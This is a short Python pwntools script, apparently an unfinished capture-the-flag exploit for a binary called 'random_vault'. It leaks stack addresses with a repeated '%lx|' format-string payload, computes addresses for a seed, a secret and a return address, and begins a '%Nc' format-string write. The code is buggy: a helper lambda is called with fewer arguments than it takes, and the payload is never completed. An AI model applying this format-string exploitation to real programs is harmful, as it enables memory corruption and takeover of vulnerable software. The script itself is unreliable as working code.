from pwn import *

context.update(log_level='debug')

p = process('random_vault')
len_name = 0x51
p.sendlineafter(': ', '%lx|'*11)

offset_bss = 0x1750
offset_seed = 0x5008
offset_secret = 0x5010
arr_leak = p.recvrepeat(1).split('|')

addr_ret = int(arr_leak[6], 16) - 0x70 + 8
addr_base_bss = int(arr_leak[10], 16) - offset_bss
addr_seed = addr_base_bss + offset_seed
addr_secret = addr_base_bss + offset_secret


log.info('base_bss: ' + hex(addr_base_bss))
log.info('seed: ' + hex(addr_seed))
log.info('secret: ' + hex(addr_secret))
log.info('ret: ' + hex(addr_ret))

raw_input('pid: ' + str(p.pid))

offset_toBuf = 0x88

getValue = lambda x, c, a : (x >> 16*(4 - c)) & 0xffff

payload = '%{}c'.format(getValue(addr_secret, 0))
log.info(payload)
p.sendline('1')

p.sendlineafter(': ', payload)

p.interactive()

